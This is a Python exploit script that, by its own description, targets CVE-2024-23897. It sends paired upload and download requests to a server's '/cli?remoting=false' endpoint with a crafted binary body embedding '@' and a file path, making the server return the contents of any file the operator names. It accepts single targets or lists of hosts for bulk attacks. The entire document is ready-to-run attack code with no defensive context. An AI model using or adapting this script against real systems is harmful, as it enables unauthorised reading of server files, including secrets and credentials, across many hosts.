import argparse
import threading
import http.client
import uuid
import urllib.parse

# Color constants
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
ENDC = '\033[0m'

def format_url(url):
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url
    return url

def send_download_request(target_info, uuid_str):
    try:
        conn = http.client.HTTPConnection(target_info.netloc)
        conn.request("POST", "/cli?remoting=false", headers={
            "Session": uuid_str,
            "Side": "download"
        })
        response = conn.getresponse().read()
        print(f"{GREEN}RESPONSE from {target_info.netloc}:{ENDC} {response}")
    except Exception as e:
        print(f"{RED}Error in download request:{ENDC} {str(e)}")

def send_upload_request(target_info, uuid_str, data):
    try:
        conn = http.client.HTTPConnection(target_info.netloc)
        conn.request("POST", "/cli?remoting=false", headers={
            "Session": uuid_str,
            "Side": "upload",
            "Content-type": "application/octet-stream"
        }, body=data)
    except Exception as e:
        print(f"{RED}Error in upload request:{ENDC} {str(e)}")

def launch_exploit(target_url, file_path):
    formatted_url = format_url(target_url)
    target_info = urllib.parse.urlparse(formatted_url)
    uuid_str = str(uuid.uuid4())
    data = b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@' + file_path.encode() + b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03'

    upload_thread = threading.Thread(target=send_upload_request, args=(target_info, uuid_str, data))
    download_thread = threading.Thread(target=send_download_request, args=(target_info, uuid_str))

    upload_thread.start()
    download_thread.start()

    upload_thread.join()
    download_thread.join()

def process_target_list(file_list, file_path):
    with open(file_list, 'r') as file:
        targets = [format_url(line.strip()) for line in file.readlines()]

    for target in targets:
        print(f"{YELLOW}Processing target:{ENDC} {target}")
        launch_exploit(target, file_path)

def main():
    parser = argparse.ArgumentParser(description='Exploit script for CVE-2024-23897.')
    parser.add_argument('-u', '--url', help='Single target URL.')
    parser.add_argument('-l', '--list', help='File with list of target hosts.')
    parser.add_argument('-f', '--file', required=True, help='File path to read from the server.')

    args = parser.parse_args()

    if args.url:
        launch_exploit(args.url, args.file)
    elif args.list:
        process_target_list(args.list, args.file)
    else:
        print(f"{RED}Error:{ENDC} Please provide a single target URL (-u) or a list of targets (-l).")

if __name__ == "__main__":
    main()
